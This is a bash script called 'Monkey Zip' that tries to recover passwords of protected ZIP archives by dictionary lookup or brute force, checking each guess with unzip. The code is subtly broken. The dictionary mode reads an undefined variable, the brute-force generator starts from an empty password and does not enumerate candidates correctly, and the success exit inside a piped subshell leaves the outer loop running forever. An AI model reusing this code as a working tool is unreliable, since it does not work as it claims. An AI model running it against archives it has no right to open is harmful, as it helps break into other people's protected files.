#!/bin/bash

# Define ANSI color codes
readonly RED='\033[0;31m'    # Red color
readonly GREEN='\033[0;32m'  # Green color
readonly YELLOW='\033[0;33m' # Yellow color
readonly ORANGE='\033[0;34m'  # Orange color
readonly NC='\033[0m'        # No color

# chars to brute force
readonly CHARS='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()'

# -------------------  Welcome text --------------------

echo -e "${ORANGE}"
figlet -c "Monkey zip"
echo -e "${NC}"

# ----------------  End of welcome text ----------------

# ---------------- Base attr args ----------------------

use_dictionary=false
use_brute_force=true # default use bruteforce

archive_path=""
dictionary_path=""
password=""

#------------------------------------------------------- 

# ----------------------- FUNCTIONS --------------------

#dispaly help menu
display_help () {
   echo "Monkey Zip - a utility for cracking password-protected ZIP archives using a dictionary."
   echo -e "\n"
   echo "Syntax: scriptTemplate monkey_zip < PATH_TO_ARCHIVE > < PATH_TO_DICTIONARY >"
   echo -e "\n\toptions:"
   echo -e "\t\t-h Print this help"
   echo
}

# brute force algorithm  
bruteforce_password() {
    local characters="$1"
    local length="$2"
    
    while true; do
        for ((i=0; i<$length; i++)); do
            current_char="${password:$i:1}"
            current_index="${characters%%$current_char*}"
            next_index=$(( ( ${#current_index} + 1 ) % ${#characters} ))
            password="${password:0:i}${characters:$next_index:1}${password:i+1}"
            if [ "${password:$i:1}" != "${characters:0:1}" ]; then
                echo "$password"
                return 0
            fi
        done
        if [ "${password:0:1}" == "${characters:((${#characters} - 1)):1}" ]; then
            password="${characters:0:1}${password:1}"
            echo "$password"
        fi
    done
}

# Attempt to extract archive with given password
attempt_extraction() {
    local password="$1"
    local archive_path="$2"
    if unzip -P "$password" -t "$archive_path" &>/dev/null; then
        return 0
    else
        return 1
    fi
}

# ----------------------- end of FUNCTIONS --------------------


# ----------- Processing command line parameters --------------

while getopts ":ha:d:" opt; do
    case ${opt} in
        h )
            # show help options
            display_help
            exit 0
            ;;

        a )
            archive_path="$OPTARG"
            ;;

        d )
            use_dictionary=true
            use_brute_force=false

            dictionary_path="$OPTARG"
            ;;

        \?)
            echo "Invalid option: -$OPTARG" >&2
            exit 1
            ;;

        :)
            echo "Option -$OPTARG requires an argument." >&2
            exit 1
            ;;
    esac
done 

# ------ end of processing command line parameters -----------

# ------------------ using dictionary block ------------------
if [ "$use_dictionary" = true ]; then
    
    # check existing of archive and dictionary
    if [ ! -f "$archive_path" ]; then
        echo -e "${RED}Error: Archive file not found${NC}"
        exit 1
    fi

    if [ ! -f "$dictionary_path" ]; then
        echo -e "${RED}Error: Dictionary file not found${NC}"
        exit 1
    fi
    

    # Get the total number of passwords in the dictionary
    totalPasswords=$(wc -l <"$dictionaryPath")
    currentPassword=0

     # Start time
    startTime=$(date +%s)

    while FBR= read -r password || [ -n "$password" ]; do
        ((currentPassword++))

        echo -ne "Progress: ${currentPassword} / ${totalPasswords} \r"

        # Attempt to extract the archive with the current password
        if attempt_extraction "$password" "$archive_path"; then
            echo -e "\n${GREEN}Success!${NC} Password is: $password"

            # Calculate elapsed time
            endTime=$(date +%s)
            timeElapsed=$((endTime - startTime))
            echo "Time elapsed: $((timeElapsed / 60)) minutes and $((timeElapsed % 60)) seconds."
            exit 0
        fi

    done <"$dictionaryPath"

    echo -e "\n${RED}Error:${NC} Failed to extract archive with any of the passwords."
    endTime=$(date +%s)
    timeElapsed=$((endTime - startTime))
    echo "Time elapsed: $((timeElapsed / 60)) minutes and $((timeElapsed % 60)) seconds."
    exit 0
fi
# ---------------- end using dispaly block -------------------

# ---------------- brute force block -------------------

if [ "$use_brute_force" = true ]; then

	 # check existing of archive and dictionary
    if [ ! -f "$archive_path" ]; then
        echo -e "${RED}Error: Archive file not found${NC} use -h to more information"
        exit 1
    fi

    echo "Brute forcing $archive_path"
    password_length=1
    # Start time
    startTime=$(date +%s)
    while true; do
        bruteforce_password "$CHARS" "$password_length" | while read -r password; do
            echo -ne "Trying password: $password \r"
            if attempt_extraction "$password" "$archive_path"; then
                echo -e "\n${GREEN}Success!${NC} Password is: $password"
                # Calculate elapsed time
                endTime=$(date +%s)
                timeElapsed=$((endTime - startTime))
                echo "Time elapsed: $((timeElapsed / 60)) minutes and $((timeElapsed % 60)) seconds."
                exit 0
            fi
        done
        ((password_length++))
    done
fi

# ---------------- end brute force block -------------------

echo "Brute force mode complete"
exit 0